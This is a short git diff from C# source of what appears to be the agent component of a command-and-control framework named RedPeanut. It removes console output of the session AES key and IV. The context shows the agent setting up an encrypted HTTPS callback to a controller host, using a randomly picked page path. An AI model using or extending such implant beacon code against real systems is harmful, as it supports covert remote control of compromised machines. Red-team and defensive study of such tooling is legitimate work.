@@ -69,8 +69,7 @@ namespace RedPeanutAgent
             agentid = agentidmsg.agentid;
             aeskey = Convert.FromBase64String(agentidmsg.sessionkey);
             aesiv = Convert.FromBase64String(agentidmsg.sessioniv);
-            Console.WriteLine(agentidmsg.sessionkey);
-            Console.WriteLine(agentidmsg.sessioniv);
+            
             this.wc = CreateWebClient(cookie, host);
 
             string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
